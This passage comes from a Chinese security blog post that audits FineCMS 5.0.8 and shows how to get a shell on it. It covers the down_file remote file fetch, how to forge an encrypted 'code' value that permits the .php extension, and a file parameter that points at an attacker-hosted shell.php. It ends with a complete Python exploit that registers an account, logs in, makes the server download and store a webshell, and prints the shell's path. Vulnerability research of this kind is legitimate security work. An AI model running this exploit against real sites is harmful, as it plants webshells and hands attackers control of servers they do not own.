+</span></span><span class="line"><span class="cl">        <span class="nv">$result</span><span class="o">.=</span> <span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$string</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">^</span> <span class="p">(</span><span class="nv">$box</span><span class="p">[(</span><span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">-</span> <span class="nx">time</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">26</span><span class="p">)</span> <span class="o">.</span> <span class="nv">$keyb</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">26</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$keyc</span> <span class="o">.</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$result</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><ul>
+<li>这段代码就是生成文件的路径，<code>dr_mkdirs</code>在上一篇的已经解释过了，生成的目录是日期。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="nv">$path</span> <span class="o">=</span> <span class="nx">SYS_UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s1">&#39;Ym&#39;</span><span class="p">,</span> <span class="nx">SYS_TIME</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">!</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">dr_mkdirs</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
+</span></span></code></pre></div><ul>
+<li>继续下面这段,<code>$furl</code>是获取file参数的值，<code>dr_catcher_data</code>这个函数可以跟进看下，只要是获取远程文件的内容的。如果远程文件没有内容就获取失败。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">        <span class="nv">$furl</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$file</span> <span class="o">=</span> <span class="nx">dr_catcher_data</span><span class="p">(</span><span class="nv">$furl</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">!</span><span class="nv">$file</span> <span class="o">&amp;&amp;</span> <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;获取远程文件失败&#39;</span><span class="p">));</span>
+</span></span></code></pre></div><ul>
+<li>这段是判断扩展名的，在这里也说下这几个函数的作用吧，<code>strrchr</code>是把<code>$ful</code>的内容中.后面的值和.一起提取出来；<code>substr</code>返回字符串中1-10的字符串，也就是说刚才提取出来的扩展名<code>.php</code>从1开始只要php；<code>trim</code>去掉两边的空格；<code>strtolower</code>把字符串全部变成小写。
+再下来这句就是判断上传的文件的扩展名<code>$fileext</code>是否在<code>$ext</code>里面。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$fileext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nx">strrchr</span><span class="p">(</span><span class="nv">$furl</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">)));</span> <span class="c1">//扩展名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">!@</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$fileext</span><span class="p">,</span> <span class="o">@</span><span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;远程文件扩展名（&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="o">.</span><span class="s1">&#39;）不允许&#39;</span><span class="p">));</span>
+</span></span></code></pre></div><ul>
+<li>这段的内容就是写文件了，文件名是随机的。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">time</span><span class="p">()),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span><span class="o">.</span><span class="nx">rand</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">999</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$path</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="p">,</span> <span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$info</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;file_ext&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;full_path&#39;</span> <span class="o">=&gt;</span> <span class="nv">$path</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;file_size&#39;</span> <span class="o">=&gt;</span> <span class="nx">filesize</span><span class="p">(</span><span class="nv">$path</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="p">)</span><span class="o">/</span><span class="mi">1024</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;client_name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="p">);</span>
+</span></span></code></pre></div><h3 id="构造扩展名参数">构造扩展名参数</h3>
+<p>这块内容可以另外当作一节来讲，重新来理顺刚才讲的代码流程就能知道如何来构造扩展名的参数。
+我们逆过来看：
+1.判断<code>$ext</code>里面的扩展名
+2.<code>$ext</code>变量获取在<code>$p['code']</code>数组里面
+3.<code>$p['code']</code>要经过<code>dr_authcode</code>函数的解密
+4.<code>$p['code']</code>又是从$url数组里面提取出来
+所以这里我们可以看到<code>$ext</code>是可控的，而我们要传入加密的<code>$p['code']</code>，我们用<code>dr_authcode</code>加密一遍就行了，在程序里面加入这句代码<code>echo dr_authcode(&quot;|php&quot;,&quot;a&quot;);</code>就可以得出加密的值，这个a可以写任意值，只要不写<code>DECODE</code>就行了。<code>|php</code>加密这个就是为了<code>list</code>这个函数的作用。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">        <span class="nv">$url</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$url</span> <span class="k">as</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$item</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="nv">$t</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$p</span><span class="p">[</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uid</span> <span class="o">&amp;&amp;</span> <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">fc_lang</span><span class="p">(</span><span class="s1">&#39;抱歉！游客不允许上传附件&#39;</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//echo dr_authcode(&#34;|php&#34;,&#34;a&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">list</span><span class="p">(</span><span class="nv">$size</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">,</span> <span class="nv">$path</span><span class="p">)</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="nx">dr_authcode</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">],</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$fileext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nx">strrchr</span><span class="p">(</span><span class="nv">$furl</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">)));</span> <span class="c1">//扩展名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">!@</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$fileext</span><span class="p">,</span> <span class="o">@</span><span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;远程文件扩展名（&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="o">.</span><span class="s1">&#39;）不允许&#39;</span><span class="p">));</span>
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms_down3.png" alt="finecms_down3"></p>
+<p>构造出url的参数为：<strong>url=code=ad3eXTkH4Wt084pW46p7DBSt1KX0FwthAs4o9oBH8WVi</strong></p>
+<h3 id="构造file参数">构造file参数</h3>
+<p>构造代码：file=http://192.168.232.128/shell.php</p>
+<p>事情没有想得那么简单，这个函数的作用是下载然后再上传，它只是获取显示出来的html的内容然后把这些内容下载下来。所以我们直接在远程服务器写php文件是不可行的。
+远程的服务器有一个要求，就是不解析PHP文件，不解析，不就把内容显示出来了么。
+最简单的方法就是用装一个apache写一个php文件就行了。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms_down4.png" alt="finecms_down4"></p>
+<h1 id="用python写getshell脚本">用Python写Getshell脚本</h1>
+<p>写这个脚本也是要注册登录获取登录后的状态再getshell
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms_down5.png" alt="finecms_down5">
+<code>finecms_down_file.py</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">author:F0rmat
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">rtarget</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">999999</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">seed</span> <span class="o">=</span> <span class="s2">&#34;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">email</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">email</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">seed</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">email</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">email</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># step 1 register</span>
+</span></span><span class="line"><span class="cl">    <span class="n">register_url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s2">&#34;/index.php?s=member&amp;c=register&amp;m=index&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">register_payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;back&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;data[username]&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&#34;data[password]&#34;</span><span class="p">:</span> <span class="s2">&#34;123456&#34;</span><span class="p">,</span> <span class="s2">&#34;data[password2]&#34;</span><span class="p">:</span> <span class="s2">&#34;123456&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="s2">&#34;data[email]&#34;</span><span class="p">:</span> <span class="n">email</span> <span class="o">+</span> <span class="s2">&#34;@&#34;</span> <span class="o">+</span> <span class="n">email</span> <span class="o">+</span> <span class="s2">&#34;.com&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># step 2 login</span>
+</span></span><span class="line"><span class="cl">    <span class="n">login_url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s2">&#34;/index.php?s=member&amp;c=login&amp;m=index&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">login_payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;back&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;data[username]&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&#34;data[password]&#34;</span><span class="p">:</span> <span class="s2">&#34;123456&#34;</span><span class="p">,</span> <span class="s2">&#34;data[auto]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="s2">&#34;/index.php?s=member&amp;c=api&amp;m=down_file&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;code=ad3eXTkH4Wt084pW46p7DBSt1KX0FwthAs4o9oBH8WVi&#34;</span><span class="p">,</span><span class="s2">&#34;file&#34;</span><span class="p">:</span><span class="n">rtarget</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># step 3 start hacking&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">register_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">register_payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">login_payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hjson</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;php&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;shell:&#34;</span><span class="o">+</span><span class="n">target</span><span class="o">+</span><span class="s2">&#34;/uploadfile/&#34;</span><span class="o">+</span><span class="n">time</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s2">&#34;%Y%m&#34;</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;/&#34;</span><span class="o">+</span><span class="n">hjson</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;failure&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">5</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="s1">&#39;python down_file_getshell.py -h http://127.0.0.1 -r http://10.0.0.1/shell.php&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rtarget</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">rtarget</span><span class="p">)</span>
+</span></span></code></pre></div><h1 id="结束">结束</h1>
+<p><code>02:13:53</code>
+为了赶这篇文章现在已经深夜了，为了实现自己的承诺，坚持下去！</p>
+<h1 id="参考">参考</h1>
+<p><a href="http://0day5.com/archives/4405/">http://0day5.com/archives/4405/</a></p>
+<p><a href="https://github.com/F0r3at/Python-Tools/blob/master/finecms/down_file_getshell.py">https://github.com/F0r3at/Python-Tools/blob/master/finecms/down_file_getshell.py</a></p>
+<p><a href="http://php.net/manual/">http://php.net/manual/</a></p>
+
+
+            <hr class="bg-gray-300 mt-8">
+
+            
+
+            
+<div class="border-l-4 border-red-400 mx-auto text-gray-500">
+    <div class="copyright">
+        <ul class="list-none">
+            <li>
+                <strong>原文作者：</strong>
+                <a rel="author" href="https://xxe.icu">F0rmat</a>
+            </li>
+            <li style="word-break:break-all">
+                <strong>原文链接：</strong>
+                <a href="https://xxe.icu/kill-the-vulnerabilities-of-getshell-v.-finecms-5.0.8-and-below-1-hole-per-day.html">https://xxe.icu/kill-the-vulnerabilities-of-getshell-v.-finecms-5.0.8-and-below-1-hole-per-day.html</a>
+            </li>
+            <li>
+                <strong>版权声明：</strong>本作品采用
+                <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh">署名 - 非商业性使用 4.0 国际 (CC BY-NC 4.0)</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。
+            </li>
+        </ul>
+    </div>
+ 
+</div>
+
+
+        </div>
+
+        
+        <div class="text-base md:text-sm text-gray-500 pt-6">
+                <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
+                    href="https://xxe.icu/tags/%E6%BC%8F%E6%B4%9E.html">
+                    #漏洞
+                </a>
+                <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
+                    href="https://xxe.icu/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html">
+                    #代码审计
+                </a>
+                <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
+                    href="https://xxe.icu/tags/php.html">
+                    #php
+                </a>
+                <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
+                    href="https://xxe.icu/tags/finecms.html">
+                    #FineCMS
+                </a>
+                <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
+                    href="https://xxe.icu/tags/getshell.html">
+                    #getshell
+                </a>
+                                    
+            </div>
+        
+
+         
+        
+            <p class="text-gray-500 text-sm text-right pt-1">
+                <span id="busuanzi_container_page_pv">
+                    本文有 <span id="busuanzi_value_page_pv"></span> 次阅读
+                </span>
+            </p>
+        
+
+    </div>
+    
+
+    
+    <hr class="bg-gray-300 dark:bg-gray-300 my-10">
+
+    
+        
+        
+        <div class="comments">
+            <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'forecho-blog';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="Secd0g/comment"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+  
+        </div>
+
+        <div class="related my-5">
+            
+
+
+<div class="p-8 mt-6 lg:mt-0 rounded shadow bg-white dark:bg-gray-800">
+    <h2 class="font-sans font-bold break-normal text-gray-700 px-2 pb-3 text-xl dark:text-gray-300">相关文章</h2>
+    
+    <li><a href="/the-latest-version-of-finecms-5.0.8-getshell-daily-two-holes.html" class="underline text-yellow-600">FineCMS最新版5.0.8两处getshell(每天一洞)</a></li>
+    
+    <li><a href="/dvwa-brute-force-update.html" class="underline text-yellow-600">DVWA之Brute Force更新</a></li>
+    
+    <li><a href="/iis6.0-remote-command-execution-vulnerability-cve-2017-7269.html" class="underline text-yellow-600">IIS6.0远程命令执行漏洞(CVE-2017-7269)</a></li>
+    
+    <li><a href="/struts2-vulnerability-poc-summary.html" class="underline text-yellow-600">Struts2漏洞POC汇总</a></li>
+    
+    <li><a href="/struts2-s2-045-jakarta-plug-in-remote-code-execution-vulnerability-exploitation-and-repair.html" class="underline text-yellow-600">Struts2 S2-045 Jakarta插件远程代码执行漏洞利用与修补</a></li>
+    
+</div>
+
+        </div>
+
+    
+
+</section>
+
+
+<div class="hidden xl:text-sm xl:block xl:w-1/4 xl:px-6 ">
+
+    <div class="lg:w-full mx-auto items-center justify-between">
+    <div class="bg-white shadow rounded overflow-hidden dark:bg-gray-800">
+        <div class="bg-cover mx-auto w-32 h-32 mt-5 rounded-full" style="background-image: url('https://avatars.githubusercontent.com/u/16066632?v=4')"> </div>
+        
+        <div class="p-4">
+            <p class="text-2xl text-center pb-2">F0rmat</p>
+            <p class="text-sm text-center text-gray-700 dark:text-gray-300">专注于信息安全、内网渗透、红队攻防</p>
+        </div>
+        <div class="flex p-4 border-t text-sm border-gray-300 text-gray-700 dark:text-gray-300">
+            <div class="flex-1 border-r border-gray-600">
+                <p class="text-center">
+                    <span class="font-bold ">
+                        85
+                    </span>
+                    文章
+                </p>
+            </div>
+            <div class="flex-1 text-center">
+                <p class="text-center">
+                    <span class="font-bold">
+                        
+                            60
+                        
+                    </span>
+                    标签
+                </p>
+            </div>
+        </div>
+        <div class="px-4 pb-4 border-t border-gray-300 dark:text-gray-200">
+            <div class="mt-6 pb-16 lg:pb-0 w-4/5 lg:w-full mx-auto flex flex-wrap items-center  text-gray-500">
+                
+                <a href="//github.com/Secd0g" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="GitHub"><i class="my-iconfont icon-social-github"></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                
